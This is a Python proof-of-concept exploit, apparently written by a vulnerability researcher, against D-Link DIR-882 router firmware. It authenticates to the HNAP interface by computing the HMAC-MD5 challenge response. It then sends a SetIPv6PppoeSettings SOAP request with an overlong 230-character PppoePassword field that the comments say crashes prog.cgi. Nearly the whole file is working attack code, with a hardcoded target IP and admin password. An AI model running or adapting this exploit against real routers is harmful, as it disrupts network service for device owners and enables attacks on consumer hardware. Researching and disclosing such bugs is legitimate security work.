#!/usr/bin/env python3

# DoS_DIR882_prog_cgi_SetIPv6PppoeSettings.py
# 
# Description: Sending a payload of a specific length causes the prog.cgi
# process to crash(the pid changes).
# 
# Firmware: DIR882A1_FW1.30B06fix03_220628
# Binary: /bin/prog.cgi
# SOAP Action: SetIPv6PppoeSettings
# Location in code: sub_484148
#
# Written by: ChinaNuke <ChinaNuke@nuke666.cn>
# Last updated on: 2022/11/16

import math
import re
import time
from hashlib import md5

import requests

IP = '192.168.0.1'
USERNAME = 'Admin'
PASSWORD = 'dir882$$'
REPEAT_TIMES = 1

trans_5C = bytes((x ^ 0x5c) for x in range(256))
trans_36 = bytes((x ^ 0x36) for x in range(256))
blocksize = md5().block_size

# Login logic copied from
# https://github.com/pr0v3rbs/CVE/blob/master/CVE-2018-19986%20-%2019990/poc.py


def hmac_md5(key, msg):
    key, msg = key.encode(), msg.encode()
    if len(key) > blocksize:
        key = md5(key).digest()
    key += b'\x00' * (blocksize - len(key))  # padding
    o_key_pad = key.translate(trans_5C)
    i_key_pad = key.translate(trans_36)
    return md5(o_key_pad + md5(i_key_pad + msg).digest())


def hnap_auth(soap_action, private_key):
    b = math.floor(int(time.time())) % 2000000000
    b = str(b)[:-2]
    h = hmac_md5(private_key, b + '"http://purenetworks.com/HNAP1/' +
                 soap_action + '"').hexdigest().upper()
    return h + " " + b


for i in range(REPEAT_TIMES):
    # ---------
    #   Login
    # ---------

    # Note: the double quotations in SOAPAction cannot be omitted.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
        'Content-Type': 'text/xml; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'SOAPAction': '"http://purenetworks.com/HNAP1/Login"'
    }

    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>{USERNAME}</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}', data=payload, headers=headers)
    # print(r.text)

    challenge = re.search(r'<Challenge>(.*?)</Challenge>', r.text).group(1)
    cookie = re.search(r'<Cookie>(.*?)</Cookie>', r.text).group(1)
    publick_key = re.search(r'<PublicKey>(.*?)</PublicKey>', r.text).group(1)

    # print(f'challenge: {challenge}')
    # print(f'cookie: {cookie}')
    # print(f'publick_key: {publick_key}')

    private_key = hmac_md5(publick_key + PASSWORD,
                           challenge).hexdigest().upper()
    password = hmac_md5(private_key, challenge).hexdigest().upper()

    headers['HNAP_AUTH'] = hnap_auth("Login", private_key)
    headers['Cookie'] = f'uid={cookie}'
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>{USERNAME}</Username><LoginPassword>{password}</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    if '<LoginResult>success</LoginResult>' in r.text:
        print('[*] Login successfully!')
    else:
        print('[!] Login failed!')

    # -----------------------------
    #   Trigger the vulnerability
    # -----------------------------

    # A string of even-length between 200 and 256 will cause the prog.cgi 
    # to crash.

    data_password = 'A' * 230
    payload = f'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetIPv6PppoeSettings xmlns="http://purenetworks.com/HNAP1/"><IPv6_ConnectionType>IPv6_PPPoE</IPv6_ConnectionType><IPv6_PppoeNewSession>NewSession</IPv6_PppoeNewSession><IPv6_PppoeType>Dynamic</IPv6_PppoeType><IPv6_PppoeStaticIp></IPv6_PppoeStaticIp><IPv6_PppoeUsername>test</IPv6_PppoeUsername><IPv6_PppoeReconnectMode>AlwaysOn</IPv6_PppoeReconnectMode><IPv6_PppoeMaxIdleTime></IPv6_PppoeMaxIdleTime><IPv6_PppoeMTU>1492</IPv6_PppoeMTU><IPv6_PppoeServiceName>test</IPv6_PppoeServiceName><IPv6_ObtainDNS>Automatic</IPv6_ObtainDNS><IPv6_PrimaryDNS></IPv6_PrimaryDNS><IPv6_SecondaryDNS></IPv6_SecondaryDNS><IPv6_DhcpPd>Enable</IPv6_DhcpPd><IPv6_LanAddress></IPv6_LanAddress><IPv6_LanIPv6AddressAutoAssignment>Enable</IPv6_LanIPv6AddressAutoAssignment><IPv6_LanAutomaticDhcpPd>Enable</IPv6_LanAutomaticDhcpPd><IPv6_LanAutoConfigurationType>SLAAC_StatelessDhcp</IPv6_LanAutoConfigurationType><IPv6_LanIPv6AddressRangeStart></IPv6_LanIPv6AddressRangeStart><IPv6_LanIPv6AddressRangeEnd></IPv6_LanIPv6AddressRangeEnd><IPv6_LanDhcpLifeTime></IPv6_LanDhcpLifeTime><IPv6_LanRouterAdvertisementLifeTime>30</IPv6_LanRouterAdvertisementLifeTime><IPv6_PppoePassword>{data_password}</IPv6_PppoePassword></SetIPv6PppoeSettings></soap:Body></soap:Envelope>'''
    headers['SOAPAction'] = '"http://purenetworks.com/HNAP1/SetIPv6PppoeSettings"'
    headers['HNAP_AUTH'] = hnap_auth("SetIPv6PppoeSettings", private_key)
    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    print(r.text)

    # if REPEAT_TIMES > 1:
    #     time.sleep(1)
